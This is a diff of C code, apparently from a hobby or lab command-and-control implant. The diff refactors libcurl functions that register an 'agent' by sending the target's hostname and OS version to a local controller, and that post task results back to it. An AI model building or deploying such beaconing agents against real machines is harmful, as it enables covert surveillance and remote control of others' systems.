@@ -14,92 +14,73 @@
 
 static size_t mem_cb(void *contents, size_t size, size_t nmemb, void *userp);
 
-bool reg(struct web_comms *web)
+bool reg(void)
 {
 	struct response chunk = {.memory = NULL, .size = 0};
+    struct web_comms web = {NULL, 0, NULL};
 
-	CURL *curl;
-	CURLcode res;
+    if(!curl_prep(&web)) {
+        perror("curl_prep failed\n");
+        exit(1);
+    }
 
-	curl_mime *form = NULL;
-
-	if (curl_global_init(CURL_GLOBAL_ALL) != 0) {
-		perror("curl_global_init error\n");
+	// Get target hostname.
+	// TO DO figure out how to import HOST_NAME_MAX
+	char hostbuf[256];
+	if (gethostname(hostbuf, sizeof(hostbuf)) == -1) {
+		perror("Error acquiring host name.\n");
 		return false;
 	}
 
-	curl = curl_easy_init();
-	if (!curl) {
-		perror("curl_easy_init error.\n");
+	add_curl_field(web.form, "hostname", hostbuf);
+
+	// Get target OS and version and pass to add_curl_field.
+	struct utsname buf1;
+	errno = 0;
+	if (uname(&buf1) != 0) {
+		perror("uname error\n");
 		return false;
-
-	} else {
-
-		/* Create the form */
-		// returns null if failure.
-		form = curl_mime_init(curl);
-		if (!form) {
-			perror("curl_mime_init error\n");
-			return false;
-		}
-		// Get target hostname.
-		// TO DO figure out how to import HOST_NAME_MAX
-		char hostbuf[256];
-		if (gethostname(hostbuf, sizeof(hostbuf)) == -1) {
-			perror("Error acquiring host name.\n");
-			return false;
-		}
-
-		add_curl_field(form, "hostname", hostbuf);
-
-		// Get target OS and version and pass to add_curl_field.
-		struct utsname buf1;
-		errno = 0;
-		if (uname(&buf1) != 0) {
-			perror("uname error\n");
-			return false;
-		}
-
-		add_curl_field(form, "os type", buf1.nodename);
-		add_curl_field(form, "os version", buf1.version);
-
-		// Add submit options to curl field data.
-		add_curl_field(form, "submit", "send");
-
-		//Registration URL
-		const char regurl[19] = "127.0.0.1:9000/reg";
-
-		curl_easy_setopt(curl, CURLOPT_URL, regurl);
-
-		curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);
-
-		// Send data to this function as opposed to writing to stdout.
-		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, mem_cb);
-
-		// Pass chunk to callback function.
-		curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
-
-		// Perform the request, res will get the return code
-		res = curl_easy_perform(curl);
-
-  		printf("The data returning from agent registration is %s\n\n", chunk.memory);
-
-		// Check for errors
-		if (res != CURLE_OK) {
-			fprintf(stderr, "curl_easy_perform() failed: %s\n",curl_easy_strerror(res));
-			return false;
-		}
-
-		// Always cleanup.
-		curl_easy_cleanup(curl);
-
-		free(chunk.memory);
-
-		// Then cleanup the form.
-		curl_mime_free(form);
-
-		return true;
 	}
+
+	add_curl_field(web.form, "os type", buf1.nodename);
+	add_curl_field(web.form, "os version", buf1.version);
+
+	// Add submit options to curl field data.
+	add_curl_field(web.form, "submit", "send");
+
+	//Registration URL
+	const char regurl[19] = "127.0.0.1:9000/reg";
+
+	curl_easy_setopt(web.curl, CURLOPT_URL, regurl);
+
+	curl_easy_setopt(web.curl, CURLOPT_MIMEPOST, web.form);
+
+	// Send data to this function as opposed to writing to stdout.
+	curl_easy_setopt(web.curl, CURLOPT_WRITEFUNCTION, mem_cb);
+
+	// Pass chunk to callback function.
+	curl_easy_setopt(web.curl, CURLOPT_WRITEDATA, (void *)&chunk);
+
+	// Perform the request, res will get the return code
+	web.res = curl_easy_perform(web.curl);
+
+	printf("The data returning from agent registration is %s\n\n", chunk.memory);
+
+	// Check for errors
+	if (web.res != CURLE_OK) {
+		fprintf(stderr, "curl_easy_perform() failed: %s\n",curl_easy_strerror(web.res));
+		return false;
+	}
+
+	// Always cleanup.
+	curl_easy_cleanup(web.curl);
+
+	free(chunk.memory);
+
+	// Then cleanup the form.
+	curl_mime_free(web.form);
+
+	return true;
 }
 
 // Takes write_function output and stores it in memory.
@@ -253,66 +234,51 @@ bool can_run_cmd(const char *cmd)
 bool post_results(struct strings_array *sa)
 {
 	struct response chunk = {.memory = malloc(0), .size = 0};
+    struct web_comms web = {NULL, 0, NULL};
 
-	CURL *curl;
-	CURLcode res;
+    if(!curl_prep(&web)) {
+        perror("curl_prep failed\n");
+        exit(1);
+    }
 
-	curl_mime *form = NULL;
+	add_curl_field(web.form, "task id", "1234");
 
-	curl = curl_easy_init();
-	if (!curl) {
-		perror("curl_easy_init error.\n");
+	add_curl_field(web.form, "task results", sa->words);
+
+	// Add submit options to curl field data.
+	add_curl_field(web.form, "submit", "send");
+
+	//Registration URL
+	const char resurl[27] = "127.0.0.1:9000/results/uuid";
+
+	curl_easy_setopt(web.curl, CURLOPT_URL, resurl);
+
+	curl_easy_setopt(web.curl, CURLOPT_MIMEPOST, web.form);
+
+	// Send data to this function as opposed to writing to stdout.
+	curl_easy_setopt(web.curl, CURLOPT_WRITEFUNCTION, mem_cb);
+
+	// Pass chunk to callback function.
+	curl_easy_setopt(web.curl, CURLOPT_WRITEDATA, (void *)&chunk);
+
+	// Perform the request, res will get the return code
+	web.res = curl_easy_perform(web.curl);
+
+	printf("The data returning from post results is %s\n\n", chunk.memory);
+
+	// Check for errors
+	if (web.res != CURLE_OK) {
+		fprintf(stderr, "curl_easy_perform() failed: %s\n",curl_easy_strerror(web.res));
 		return false;
-
-	} else {
-
-		/* Create the form */
-		// returns null if failure.
-		form = curl_mime_init(curl);
-		if (!form) {
-			perror("curl_mime_init error\n");
-			return false;
-		}
-
-		add_curl_field(form, "task id", "1234");
-
-		add_curl_field(form, "task results", sa->words);
-
-		// Add submit options to curl field data.
-		add_curl_field(form, "submit", "send");
-
-		//Registration URL
-		const char resurl[27] = "127.0.0.1:9000/results/uuid";
-
-		curl_easy_setopt(curl, CURLOPT_URL, resurl);
-
-		curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);
-
-		// Send data to this function as opposed to writing to stdout.
-		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, mem_cb);
-
-		// Pass chunk to callback function.
-		curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
-
-		// Perform the request, res will get the return code
-		res = curl_easy_perform(curl);
-
-  		printf("The data returning from post results is %s\n\n", chunk.memory);
-
-		// Check for errors
-		if (res != CURLE_OK) {
-			fprintf(stderr, "curl_easy_perform() failed: %s\n",curl_easy_strerror(res));
-			return false;
-		}
-
-		// Always cleanup.
-		curl_easy_cleanup(curl);
-
-		free(chunk.memory);
-
-		// Then cleanup the form.
-		curl_mime_free(form);
-
-		return true;
 	}
+
+	// Always cleanup.
+	curl_easy_cleanup(web.curl);
+
+	free(chunk.memory);
+
+	// Then cleanup the form.
+	curl_mime_free(web.form);
+
+	return true;
 }
